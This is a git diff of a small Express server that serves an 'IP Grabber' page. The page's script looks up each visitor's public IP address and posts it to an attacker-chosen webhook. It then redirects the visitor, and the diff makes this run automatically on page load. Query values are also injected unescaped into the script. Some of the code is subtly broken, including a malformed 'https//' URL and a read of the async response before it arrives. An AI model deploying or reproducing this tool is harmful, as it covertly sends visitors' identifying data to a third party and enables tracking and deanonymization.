@@ -4,30 +4,33 @@ const path = require('path');
 
 app.get('/', (req, res) => {
   if ("hook" in req.query && "redirect" in req.query) {
-    var payload_msg = "``` ```";
-    res.send(`<html><body><script>
-
+    res.send(`
+    <html>
+    <body>
+    hi there ;)
+    <script>
     function IPgrab()
-{
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open('GET', '//api.ipify.org/?format=text');
-    xmlHttp.send( null );
-    var IP =  xmlHttp.responseText;
-
+    {
+    const xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+    console.log(xhr.responseText);
+    }
+    };
+    xhr.open("GET", "https//api.ipify.org/?format=text");
+    xhr.send();
+    var IP =  xhr.responseText;
     var request = new XMLHttpRequest();
     request.open('POST', '${ req.query.hook }');
-
     request.setRequestHeader('Content-type', 'application/json');
-
-    var params = {
-        content: '**XYZ IP Grabber** | ' + IP
-    }
-
+    var params = {content: '**XYZ IP Grabber** | ' + IP}
     request.send(JSON.stringify(params));
-
     window.location.replace('${ req.query.redirect }');
-}
-    </script></body></html>`);
+    }
+    window.onload = IPgrab();
+    </script>
+    </body>
+    </html>`);
   } else {
     res.sendFile(path.join(__dirname+'/index.html'));
   }
